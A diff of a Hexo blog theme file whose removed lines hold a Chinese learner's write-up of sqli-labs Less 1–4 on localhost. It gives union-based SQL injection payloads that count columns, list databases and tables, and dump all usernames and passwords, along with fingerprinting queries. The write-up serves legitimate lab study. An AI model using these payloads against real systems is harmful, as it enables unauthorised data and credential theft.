@@ -1,66 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="{{ page.lang }}">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.4.0">
+  {{ partial('_partials/head/head.njk', {}, {cache: theme.cache.enable}) }}{{ open_graph() }}
 
 
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
+<link rel="canonical" href="{{ canonical }}">
 
 
 
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+{{ next_data('page', next_config_unique()) }}
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="sql注入基本步骤 单引号，and 1&#x3D;1，and 1&#x3D;2，双引号括号来判断是否存在错误  order by 判断数据有多少列  寻找那些数据回显  利用union 查询或者报错注入  获取数据库，版本等信息  最后获取获取信息   less 1下面都是我的心路历程顺便补充这是在网页上进行的操作，前几天我一直在mysql命令行操作，那是不对的，怎么说，我的理解是sql-libs原本应该用虚拟机搭建">
-<meta property="og:type" content="article">
-<meta property="og:title" content="less1~4总结">
-<meta property="og:url" content="http://example.com/2021/10/08/less1-4%E6%80%BB%E7%BB%93/index.html">
-<meta property="og:site_name" content="wds">
-<meta property="og:description" content="sql注入基本步骤 单引号，and 1&#x3D;1，and 1&#x3D;2，双引号括号来判断是否存在错误  order by 判断数据有多少列  寻找那些数据回显  利用union 查询或者报错注入  获取数据库，版本等信息  最后获取获取信息   less 1下面都是我的心路历程顺便补充这是在网页上进行的操作，前几天我一直在mysql命令行操作，那是不对的，怎么说，我的理解是sql-libs原本应该用虚拟机搭建">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2021/10/09/FAugm8taksVd3er.png">
-<meta property="og:image" content="c:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20211009123956628.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/09/dgsMq6SvlDeLryI.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/09/xgRpJceHryQNinV.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/09/4P8ugfHAmyE6zor.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/09/6KUQ8kMjioE4rnG.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/09/v7lMpV3oG4Hr6K8.png">
-<meta property="og:image" content="https://i.loli.net/2021/10/09/xw4LiEG8fnqvgQP.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/25/OaveyfJD5Slhq8u.png">
-<meta property="article:published_time" content="2021-10-08T12:23:03.000Z">
-<meta property="article:modified_time" content="2022-02-25T13:28:38.557Z">
-<meta property="article:author" content="发福的小菜狗">
-<meta property="article:tag" content="sql注入">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2021/10/09/FAugm8taksVd3er.png">
-
-
-<link rel="canonical" href="http://example.com/2021/10/08/less1-4%E6%80%BB%E7%BB%93/">
-
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/10/08/less1-4%E6%80%BB%E7%BB%93/","path":"2021/10/08/less1-4总结/","title":"less1~4总结"}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>less1~4总结 | wds</title>
-  
-
-
-
-
+{{ next_data('calendar',
+  theme.calendar if page.type === 'schedule' else '')
+}}
+<title>{{ page.title }} | {{ title }}</title>
+  {{ partial('_third-party/analytics/index.njk', {}, {cache: theme.cache.enable}) }}
+  {{- next_inject('head') }}
   <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
+    <link rel="stylesheet" href="{{ url_for(theme.css) }}/noscript.css">
   </noscript>
-<link rel="alternate" href="/atom.xml" title="wds" type="application/atom+xml">
+<link rel="alternate" href="/atom.xml" title="wds's 学习博客" type="application/atom+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
@@ -68,320 +27,25 @@
 
   <main class="main">
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
+      <div class="header-inner">{{ partial('_partials/header/brand.njk', {}, {cache: theme.cache.enable}) }}
 
-  <div class="site-meta">
+{{ partial('_partials/header/menu.njk', {}, {cache: theme.cache.enable}) }}
 
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <h1 class="site-title">wds</h1>
-      <i class="logo-line"></i>
-    </a>
-  </div>
+{{ partial('_partials/search/index.njk', {}, {cache: theme.cache.enable}) }}
 
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu">
-        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
-        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
-        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
-  </ul>
-</nav>
-
-
-
-
+{{- next_inject('header') }}
 </div>
         
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-
-  <aside class="sidebar">
-
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.</span> <span class="nav-text">sql注入基本步骤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-1%E4%B8%8B%E9%9D%A2%E9%83%BD%E6%98%AF%E6%88%91%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">less 1下面都是我的心路历程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E9%98%B6%E6%93%8D%E4%BD%9Cgroup-concat%EF%BC%88%EF%BC%89%E5%B5%8C%E5%A5%97concat-ws-%E2%80%98%E4%BB%BB%E6%84%8F%E2%80%99%EF%BC%8Ca%EF%BC%8Cb-%E4%BC%98%E5%8C%96%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="nav-number">2.1.</span> <span class="nav-text">进阶操作group_concat（）嵌套concat_ws(‘任意’，a，b)优化用户名和密码的获取</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#order-by-%E8%AF%AD%E5%8F%A5%E8%A7%A3%E8%AF%BB"><span class="nav-number">3.</span> <span class="nav-text">order by 语句解读</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#union-select-%E6%8C%87%E4%BB%A4%E8%A7%A3%E8%AF%BB"><span class="nav-number">4.</span> <span class="nav-text">union select 指令解读</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#select-from-users-where-id-%E2%80%991%E2%80%98-limit-0-1%EF%BC%9B%E8%A7%A3%E8%AF%BB"><span class="nav-number">5.</span> <span class="nav-text">select * from users where id&#x3D;’1‘ limit 0,1；解读</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#group-concat-%E8%A7%A3%E8%AF%BB"><span class="nav-number">6.</span> <span class="nav-text">group_concat()解读</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#concat-ws-%E2%80%98%E4%BB%BB%E6%84%8F%E7%AC%A6%E5%8F%B7%E2%80%99%EF%BC%8Ca%EF%BC%8Cb-%E8%A7%A3%E8%AF%BB"><span class="nav-number">7.</span> <span class="nav-text">concat_ws(‘任意符号’，a，b)解读</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E8%AF%AD%E5%8F%A5%EF%BC%88jc%EF%BC%89"><span class="nav-number">8.</span> <span class="nav-text">基本操作语句（jc）</span></a></li></ol></div>
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">发福的小菜狗</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap site-overview-item animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">35</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">9</span>
-        <span class="site-state-item-name">categories</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">9</span>
-        <span class="site-state-item-name">tags</span></a>
-      </div>
-  </nav>
-</div>
-
-
-
-        </div>
-      </div>
-    </div>
-  </aside>
-  <div class="sidebar-dimmer"></div>
-
+  {{ sidebar_template.render(true) }}
 
     </header>
 
-    
-  <div class="back-to-top" role="button" aria-label="Back to top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
+    {{ partial('_partials/widgets.njk', {}, {cache: theme.cache.enable}) }}
 
     <div class="main-inner post posts-expand">
 
 
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/08/less1-4%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          less1~4总结
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-10-08 20:23:03" itemprop="dateCreated datePublished" datetime="2021-10-08T20:23:03+08:00">2021-10-08</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-25 21:28:38" itemprop="dateModified" datetime="2022-02-25T21:28:38+08:00">2022-02-25</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-        <h1 id="sql注入基本步骤"><a href="#sql注入基本步骤" class="headerlink" title="sql注入基本步骤"></a>sql注入基本步骤</h1><ol>
-<li><p>单引号，and 1=1，and 1=2，双引号括号来判断是否存在错误</p>
-</li>
-<li><p>order by 判断数据有多少列</p>
-</li>
-<li><p>寻找那些数据回显</p>
-</li>
-<li><p>利用union 查询或者报错注入</p>
-</li>
-<li><p>获取数据库，版本等信息</p>
-</li>
-<li><p>最后获取获取信息</p>
-</li>
-</ol>
-<h1 id="less-1下面都是我的心路历程"><a href="#less-1下面都是我的心路历程" class="headerlink" title="less 1下面都是我的心路历程"></a>less 1下面都是我的心路历程</h1><p>顺便补充这是在网页上进行的操作，前几天我一直在mysql命令行操作，那是不对的，怎么说，我的理解是sql-libs原本应该用虚拟机搭建的（是管理员方），然后web浏览器的操作上操作（是游客方），sql注入问题就是会让游客方看到管理员方能看到的数据但我之前一直用mysql命令行输操作（就是管理员方查看数据毫无意义），我看我自己行为。</p>
-<p>首先 输入</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://localhost/Less-1/?id=1">http://localhost/Less-1/?id=1</a> 是正常返回的，</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/10/09/FAugm8taksVd3er.png" alt="QQ截图20211009123350.png"></p>
-<p>当输入</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://localhost/Less-1/?id=1%27">http://localhost/Less-1/?id=1%27</a> （%27 是单引号，url自动转换的），这里可以判断有注入问题，</p>
-</blockquote>
-<p>输入</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://localhost/Less-1/?id=1&#39;order">http://localhost/Less-1/?id=1&#39;order</a> by2<br>开始报错，由报错内容可知道我们输入的‘order by’与后面的‘limit 0,1’语法冲突了，这是什么意思呢？</p>
-</blockquote>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211009123956628.png" alt="image-20211009123956628"></p>
-<p>让我们打开根目录的文件看看吧，查找带limit的函数（虽然是‘我看我自己’行为，但是这样方便自己理解）</p>
-<p>这里有一句$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>
-<p>为了方便后面学习，我们可以在下面打</p>
-<blockquote>
-<p>echo $sql;//这里意思是print sql 以字符串形式</p>
-<p>echo “《br》” ;//因为我这里打出来就变成换行了，所以我用中文打符号，懂都懂<br><img src="https://i.loli.net/2021/10/09/dgsMq6SvlDeLryI.png" alt="QQ截图20211009161844.png"></p>
-</blockquote>
-<p>当我们在mysql命令行中输入后，返回数据对比发现SELECT * FROM users WHERE id=’1’ LIMIT 0,1返回的数据和在web输入？ID=1返回的数据有些相同又有些不同，但是我们可以经过修改？ID=2 ？ID=3发现我们在web上输入的？ID=1，是给$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;中的“ID”赋值，那么我们基本上就能猜到这个语句就是返回数据的。</p>
-<p><img src="https://i.loli.net/2021/10/09/xgRpJceHryQNinV.png" alt="QQ截图20211009145206.png"></p>
-<p>这样我们就知道了第二步中，ID被我们赋值成了“1’ order by”，语句变成了</p>
-<p>select  * from user where id=’1’ order by10’ limit 0,1;</p>
-<p>这个语句肯定是不能执行的，所以我们通过将多出来的单引号和后面的limit0,1注释（–+，#，–都可以）掉，让order by 语句合法。</p>
-<p>输入？id=1’  order by10 –+通过这种方法来利用是否报错来判断数据有多少列。</p>
-<p><img src="https://i.loli.net/2021/10/09/4P8ugfHAmyE6zor.png" alt="QQ截图20211009160530.png"></p>
-<p>这里没有报错，但是也没有回显，说明没有第10列。</p>
-<p>输入？id=1’ order by 3 –+正常回显，说明数据有三列</p>
-<p><img src="https://i.loli.net/2021/10/09/6KUQ8kMjioE4rnG.png" alt="QQ截图20211009162156.png"></p>
-<p>然后输入？Id=-1’ union select 1,2,3–+ 查看哪些数据可以回显（1,2，3。。取决于多少列）</p>
-<p>利用回显输入？id=-1‘ union select 1,2，databases（）–+可以查看数据库名称；</p>
-<p>输入？id-1‘ union select 1，2 ，schema_name from information_schema.schemata –+ 可以返回第一个数据库通过加入limit 1,2可以输出第二个数据库名称但是跟我们想象的不一样，只输出了一个数据库名称，</p>
-<p>这样一次次是可以得到所以的数据库名称</p>
-<p>或者更简单一次性输出</p>
-<p>输入？id=-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
-<p>了解了group_concat()之后查表也就方便很多</p>
-<p>输入?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_name=’security’–+ (最好把security改成16进制来避免出现引号问题)</p>
-<p>输入?id=-1’ union select 1,2,group_concat(column_name) from informaion_schema.columns where</p>
-<p>table_name=’users’</p>
-<p>输入?id=-1’union select 1,2,group_concat(username) from security.users–+取出所有用户名</p>
-<p>输入?id=-1’union select 1,2,group_concat(password) from security.users–+取出所有的密码</p>
-<p>这种操作复杂，但是我找到巨佬的进阶操作，666</p>
-<h2 id="进阶操作group-concat（）嵌套concat-ws-‘任意’，a，b-优化用户名和密码的获取"><a href="#进阶操作group-concat（）嵌套concat-ws-‘任意’，a，b-优化用户名和密码的获取" class="headerlink" title="进阶操作group_concat（）嵌套concat_ws(‘任意’，a，b)优化用户名和密码的获取"></a>进阶操作group_concat（）嵌套concat_ws(‘任意’，a，b)优化用户名和密码的获取</h2><p>输入?id=-1’ union select 1,2,group_concat(concat_ws(‘~’，username，password)) from security.users–+</p>
-<p>将username和password拼凑输出</p>
-<hr>
-<h1 id="order-by-语句解读"><a href="#order-by-语句解读" class="headerlink" title="order by 语句解读"></a>order by 语句解读</h1><p>由上可知道 order by是用来推测数据库的列数，但是他的真正用途是给指定的列asdf对结果集进行排序的。（用途百度来的）用一种更直观的方式来表达。</p>
-<p>这是 order by 前的数据库</p>
-<p>order by 2后（一目了然，不枉费我玩了两天mysql）</p>
-<hr>
-<h1 id="union-select-指令解读"><a href="#union-select-指令解读" class="headerlink" title="union select 指令解读"></a>union select 指令解读</h1><p>在执行过 union select 1,2,3后，自动填充了一行1,2,3，所以在使用之前要判断列数；</p>
-<p>select 1,2,3 select直接加数字串，这里的字符串就变成了一个数组（是一个行向量，就是会与列表从左到右一一对应）</p>
-<p>id=-1  联合查询后两个查询结果合并输出，因此要然id=-1报错，才能输出最后一行来判断哪些位置回显；</p>
-<p><img src="https://i.loli.net/2021/10/09/v7lMpV3oG4Hr6K8.png" alt="QQ截图20211009203759.png"></p>
-<hr>
-<h1 id="select-from-users-where-id-’1‘-limit-0-1；解读"><a href="#select-from-users-where-id-’1‘-limit-0-1；解读" class="headerlink" title="select * from users where id=’1‘ limit 0,1；解读"></a>select * from users where id=’1‘ limit 0,1；解读</h1><p>根据解题过程select * from users where id=’1‘ limit 0,1 大概能猜到这是一个返回数据的指令</p>
-<p>但是当我们把where语句去掉select * from users limit 0,1他任然可以正常返回而且返回值跟不改一样；</p>
-<p><img src="https://i.loli.net/2021/10/09/xw4LiEG8fnqvgQP.png" alt="QQ截图20211009211815.png"></p>
-<p>当我改成limit1，2；时，返回值变成了两个分别是id 2，3的username和password;</p>
-<p>我第一时间联想到了c语言中的for循环语句for(int i=0;i&lt;n;i++) limit 0，1；</p>
-<p>两个变量分别表示输出地址起点 和 输出次数。</p>
-<hr>
-<h1 id="group-concat-解读"><a href="#group-concat-解读" class="headerlink" title="group_concat()解读"></a>group_concat()解读</h1><p>?id=-1’union select 1,2,group_concat(password) from security.users</p>
-<p>将security下的所有password组成一行字符串输出，但是连接字符是有长度限制的，默认为1024；</p>
-<p>所以如果结果字符串太长的话，就会在在数据库中被截取，因此没有显示全部数据。</p>
-<p>可以利用</p>
-<blockquote>
-<p>set global group_concat_max_len=1 //来调整输出的最大字符串长度</p>
-</blockquote>
-<hr>
-<h1 id="concat-ws-‘任意符号’，a，b-解读"><a href="#concat-ws-‘任意符号’，a，b-解读" class="headerlink" title="concat_ws(‘任意符号’，a，b)解读"></a>concat_ws(‘任意符号’，a，b)解读</h1><p>就是将a和b 用任意符号连接</p>
-<p>concat_ws(‘~’,a,b)</p>
-<p>a~b</p>
-<p>但是只能输出一个用户名的密码所以要嵌套在group_concat()内</p>
-<hr>
-<h1 id="基本操作语句（jc）"><a href="#基本操作语句（jc）" class="headerlink" title="基本操作语句（jc）"></a>基本操作语句（jc）</h1><blockquote>
-<p>select system_user()  //显示系统用户</p>
-<p>select user（）//显示系统用户</p>
-<p>select version（）//显示MySQL版本信息</p>
-<p>select database（）//显示数据库名称</p>
-<p>select @@datadir //显示MySQL安装路径</p>
-<p>select @@version_compile_os; //显示操作系统版本</p>
-<p>left(a,b)//从左开始截取a的前b位判断，正确返回1，错误返回0</p>
-<p>select user() regexp ‘r’;    regexp为匹配字符串user()的正则表达式，不管输入多少，相同                                                                                                                                                                                                  </p>
-</blockquote>
-<hr>
-<p><img src="https://s2.loli.net/2022/02/25/OaveyfJD5Slhq8u.png" alt="QQ浏览器截图20190406021639.png"></p>
-
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
-          </div>
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/2021/10/06/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs/" rel="prev" title="sql注入之sqli-labs">
-                  <i class="fa fa-chevron-left"></i> sql注入之sqli-labs
-                </a>
-            </div>
-            <div class="post-nav-item">
-                <a href="/2021/10/21/%E2%80%9C%E9%B2%B2%E9%B9%8F%E6%9D%AF%E6%88%98%E5%90%8E%E6%80%BB%E7%BB%93%E2%80%9D/" rel="next" title="“鲲鹏杯战后总结”">
-                  “鲲鹏杯战后总结” <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
-</div>
-
-
-
-
+  {{ partial('_macro/post.njk', {post: page}) }}
 
 
 </div>
@@ -389,37 +53,14 @@
 
   <footer class="footer">
     <div class="footer-inner">
-
-
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">发福的小菜狗</span>
-</div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
-  </div>
-
+{{ partial('_partials/footer.njk', {}, {cache: theme.cache.enable}) }}
     </div>
   </footer>
 
-  
-  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+  {{ partial('_scripts/index.njk', {}, {cache: theme.cache.enable}) }}
+  {{ partial('_third-party/index.njk', {}, {cache: theme.cache.enable}) }}
+  {{ partial('_third-party/statistics/index.njk', {}, {cache: theme.cache.enable}) }}
 
-  
-
-
-
-
-
-  
-
-
-
-
-
+{{- next_inject('bodyEnd') }}
 </body>
 </html>
